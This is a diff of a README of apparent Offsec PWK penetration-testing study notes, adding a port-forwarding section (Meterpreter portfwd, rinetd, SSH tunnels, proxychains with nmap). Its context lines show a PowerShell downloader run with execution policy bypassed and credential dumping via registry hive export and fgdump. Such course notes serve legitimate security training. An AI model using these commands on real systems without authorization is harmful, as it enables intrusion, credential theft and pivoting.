@@ -10,7 +10,7 @@ Offsec PWK notes and frecuently used files.
   <li><a href="#ReverseShells">Reverse Shells</a></li>
   <li><a href="#PrivilegeEscalation">Privilege Escalation</a></li>
   <li><a href="#FileTransfers">File Transfers</a></li>
-  <li><a href="#PostExploitation">PostExploitation/a></li>
+  <li><a href="#PostExploitation">Post Exploitation </a></li>
   <li><a href="#PortForwarding">Port Forwarding</a></li>
   <li><a href="#WebAttacks">Web Attacks</a></li>
   <li><a href="#LessonsLearned">Lessons Learned</a></li>
@@ -423,7 +423,7 @@ Remote
     echo $webclient.DownloadFile($url,$file) >>wget.ps1
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
-<div id="PostExploitation"> <h3>7. PostExploitation</h3></div>
+<div id="PostExploitation"> <h3>8. Post Exploitation</h3></div>
 
 <h4>Find interesting files </h4>
 
@@ -478,3 +478,39 @@ Remote machine
     reg save HKLM\SYSTEM %computername%.system
 
     fgdump.exe
+
+<div id="PortForwarding"> <h3>9. Port Forwarding</h3></div>
+
+<h4>PortForward with Meterpreter</h4>
+
+    portfwd add -l 8000 -p 3389 -r 1.1.1.1
+
+<h4>Port Forward Redirection</h4>
+
+All connections to 1.1.1.1:9000 will be forwarded to 2.2.2.2:80
+
+    vi /etc/rinetd.conf 
+    # bindaddress bindport connectaddress connectport
+    1.1.1.1 9000 2.2.2.2 80
+    rinetd
+
+<h4>SSH Local Port Forwarding </h4>
+
+The local machine connects to a host on the outside (1.1.1.) through SSH and- then forwards traffic sent to the local loopback on a given port (9090) to a host on the Internet (2.2.2.2) on a remote port (443) 
+
+    ssh root@1.1.1.1 -L 9090:2.2.2.2:443
+
+<h4>SSH Remote PortForwarding</h4>
+
+
+A remote host connects to my machine (10.10.10.10) through SSH which is running on port 53 and publishes one if its open ports (10443) through my local loopback on a local port (10000)
+
+    ssh 10.10.10.10 -p 53 -R 10000:127.0.0.1:10443
+
+<h4>Socks4 and Proxychains </h4>
+
+The local machine connects to a remote host 1.1.1.1 and proxies its traffic thru the remote host to another host 2.2.2.2
+
+    ssh -D 8080 root@1.1.1.1
+    proxychains nmap -p 22,80,222,10000 -sT -Pn 2.2.2.2
+
